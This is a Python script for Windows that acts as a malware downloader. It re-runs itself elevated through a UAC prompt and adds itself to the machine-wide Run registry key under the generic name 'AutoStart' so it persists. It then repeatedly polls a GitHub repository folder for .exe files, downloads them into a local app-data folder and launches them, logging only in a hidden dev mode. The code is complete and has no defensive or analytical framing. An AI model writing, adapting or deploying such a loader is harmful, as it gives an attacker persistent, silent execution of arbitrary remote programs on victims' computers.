import ctypes, os, sys, time, threading, winreg, requests

DEV = "--dev" in sys.argv

def log(message):
    if DEV:
        print(message, flush=True)

path = os.path.abspath(__file__)

if not ctypes.windll.shell32.IsUserAnAdmin():
    params = f'"{path}"' + (" --dev" if DEV else "")
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, os.path.dirname(path), 1)
    sys.exit()

with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as key:
    winreg.SetValueEx(key, "AutoStart", 0, winreg.REG_SZ, f'"{sys.executable}" "{path}"')

repo_url = "https://api.github.com/repos/Esorlex/Solar/contents/check"
download_dir = os.path.join(os.environ.get("LOCALAPPDATA", os.path.expanduser("~")), "SolarDownloads")

os.makedirs(download_dir, exist_ok=True)

def launch(out_path, filename):
    log(f"Launching {filename}...")
    ctypes.windll.shell32.ShellExecuteW(None, "open", out_path, None, download_dir, 1)
    log(f"Launched {filename}.")

def download_and_launch():
    session = requests.Session()

    while True:
        try:
            log("Checking repository for executable files...")

            response = session.get(repo_url, timeout=30)
            response.raise_for_status()
            files = response.json()

            if not isinstance(files, list):
                log("Unexpected repository response.")
                time.sleep(30)
                continue

            executables = [
                item for item in files
                if item.get("type") == "file"
                and item.get("name", "").lower().endswith(".exe")
                and item.get("download_url")
            ]

            if not executables:
                log("No executable files found. Checking again in 30 seconds.")
                time.sleep(30)
                continue

            for file_info in executables:
                filename = os.path.basename(file_info["name"])
                out_path = os.path.join(download_dir, filename)

                log(f"Downloading {filename}...")

                download = session.get(file_info["download_url"], timeout=60)
                download.raise_for_status()

                with open(out_path, "wb") as output:
                    output.write(download.content)

                log(f"Downloaded {filename}.")

                launch(out_path, filename)

            session.close()
            return

        except (requests.RequestException, OSError, ValueError) as error:
            log(f"Error: {error}")
            log("Retrying in 30 seconds.")
            time.sleep(30)

def main():
    worker = threading.Thread(target=download_and_launch, daemon=True)
    worker.start()
    worker.join()
    os._exit(0)

if __name__ == "__main__":
    main()